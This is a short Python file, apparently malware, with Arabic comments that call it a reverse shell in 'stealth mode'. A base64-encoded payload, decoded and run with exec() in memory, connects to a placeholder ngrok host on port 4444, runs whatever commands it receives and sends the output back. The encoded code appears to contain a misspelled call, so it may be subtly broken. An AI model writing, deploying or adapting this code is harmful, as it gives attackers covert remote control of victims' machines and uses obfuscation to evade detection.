# [FILE: payload.py]
import base64, socket, subprocess, os

# الكود الأصلي مشفر (Reverse Shell)
_encoded_data = "ZGVmIGNvbm5lY3QoKToNCiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgIHRyeToNCiAgICAgICAgcy5jb25uZWN0KCgnTkdST0tfVVJMJywgNDQ0NCkpDQ0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgY21kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpDQogICAgICAgICAgICBpZiBjbWQubG93ZXIoKSA9PSAnZXhpdCc6IGJyZWFrDQogICAgICAgICAgICBvID0gc3VicHJvY2Vzcy5nZXRvdXRwdShjbWQpDQogICAgICAgICAgICBzLnNlbmQoby5lbmNvZGUoKSkNCiAgICBleGNlcHQ6IHBhc3MNCmNvbm5lY3QoKQ=="

def _start():
    # فك التشفير والتنفيذ المباشر في الذاكرة (Stealth Mode)
    _exec_code = base64.b64decode(_encoded_data).decode()
    exec(_exec_code)

if __name__ == "__main__":
    _start()
